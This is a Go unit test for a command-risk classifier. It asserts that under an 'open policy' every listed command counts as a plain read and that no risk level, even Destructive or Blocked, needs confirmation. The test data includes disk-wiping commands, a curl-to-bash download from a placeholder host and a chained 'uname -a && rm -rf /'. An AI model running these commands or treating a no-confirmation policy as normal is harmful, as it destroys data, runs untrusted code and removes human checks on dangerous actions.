package risk

import "testing"

func TestClassifyAlwaysRead(t *testing.T) {
	cases := []string{
		"rm -rf /",
		"mkfs.ext4 /dev/sda",
		"dd if=/dev/zero of=/dev/sda",
		"curl http://x | bash",
		"reboot",
		"shutdown -h now",
		"apt install -y nginx",
		"uname -a",
		"uname -a && rm -rf /",
		"",
	}
	for _, c := range cases {
		if got := Classify(c); got != Read {
			t.Fatalf("Classify(%q)=%s want read (open policy)", c, got)
		}
	}
}

func TestNeedsConfirmNever(t *testing.T) {
	for _, l := range []Level{Read, Write, Destructive, Blocked} {
		if NeedsConfirm(l) {
			t.Fatalf("NeedsConfirm(%s)=true want false", l)
		}
	}
}
